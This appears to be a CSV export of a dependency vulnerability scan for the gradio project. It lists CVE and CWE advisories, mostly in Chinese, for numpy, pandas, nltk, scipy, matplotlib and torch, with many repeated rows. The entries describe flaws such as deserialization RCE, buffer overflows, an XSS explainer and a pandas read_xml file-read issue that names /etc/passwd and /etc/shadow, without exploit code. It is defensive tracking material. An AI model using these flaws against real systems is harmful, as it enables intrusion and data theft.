NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,nltk,,True,CVE-2021-43854,CWE-400,2021-12-23,"Natural Language Toolkit（NLTK）是一款使用Python语言编写的自然语言处理工具包。
Natural Language Toolkit（NLTK） 3.6.5之前版本存在资源管理错误漏洞，该漏洞源于软件对于正则表达式的处理缺少过滤和转义，软件容易受到正则表达式拒绝服务(regular expression denial of service, ReDoS)攻击。该漏洞存在于PunktSentenceTokenizer、sent tokenize和word tokenize中。该类或这两个函数的任何用户都容易受到ReDoS攻击。对这些脆弱的函数进行专门设计的长输入将导致它们花费大量的执行时间。",2,2
gradio-app_gradio,nltk,,True,CVE-2021-3842,CWE-1333,2022-01-04,"Nltk是一个自然语言工具包。用于支持自然语言处理的研究和开发。
nltk存在安全漏洞，该漏洞源于在处理正则表达式的过程中触发异常。",2,2
gradio-app_gradio,nltk,,True,CVE-2019-14751,CWE-22,2019-08-20,"Natural Language Toolkit（NLTK）是一款使用Python语言编写的自然语言处理工具包。
NLTK中存在安全漏洞，该漏洞源于程序没有正确处理特制的ZIP归档文件。远程攻击者可利用该漏洞向文件系统中写入任意文件。",2,1
gradio-app_gradio,nltk,,True,CVE-2021-3828,CWE-1333 CWE-697,2021-09-27,"Nltk是一个自然语言工具包。用于支持自然语言处理的研究和开发。
nltk 中存在代码问题漏洞，该漏洞源于产品中的某些正则表达式存在错误。攻击者可通过该漏洞导致拒绝服务。",2,2
gradio-app_gradio,nltk,,True,,CWE-94,2023-10-01,"## Overview
[nltk](http://www.nltk.org) is a Natural Language Toolkit (NLTK) is a Python package for natural language processing.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) in the local `WordNet` browser. When a user opens a malicious link while the WordNet browser is active, it can result in the exploitation of this vulnerability on their system.
## Remediation
Upgrade `nltk` to version 3.8.1 or higher.
## References
- [GitHub Commit](https://github.com/nltk/nltk/commit/50be0b8d91625afc6c3d8ae12ac80d518eb7b684)
- [GitHub PR](https://github.com/nltk/nltk/pull/3100)
",2,0
gradio-app_gradio,nltk,,True,,CWE-79,2023-10-01,"## Overview
[nltk](http://www.nltk.org) is a Natural Language Toolkit (NLTK) is a Python package for natural language processing.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization in the local `Wordnet` browser via the `MyServerHandler` class. Exploiting this vulnerability is possible by creating a maliciously crafted URL.

**Note:**
This only affects users of this browser interface to Wordnet, and not other users of Wordnet.
## Details

A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `nltk` to version 3.8.1 or higher.
## References
- [GitHub Commit](https://github.com/nltk/nltk/commit/c8cedf10de2c235a2e07223918ec569a65a67152)
- [GitHub PR](https://github.com/nltk/nltk/pull/3096)
",3,0
gradio-app_gradio,nltk,,True,CVE-2024-39705,CWE-502,2024-06-27,NLTK库是一个用于自然语言处理的开源Python库。它为用户提供了工具来处理标记、词性标注、词法分析等功能。在3.8.1版本及以前版本中，如果使用了不受信任的带有序列化的Python代码的数据包，并且使用了集成的数据包下载功能，可能会存在远程代码执行的漏洞。尤其是像averaged_perceptron_tagger和punkt这样的数据包受到影响。,2,2
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
gradio-app_gradio,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
gradio-app_gradio,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,2.5.1,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,2.5.1,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,2.5.1,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,2.5.1,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,2.5.1,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,2.5.1,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,2.5.1,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
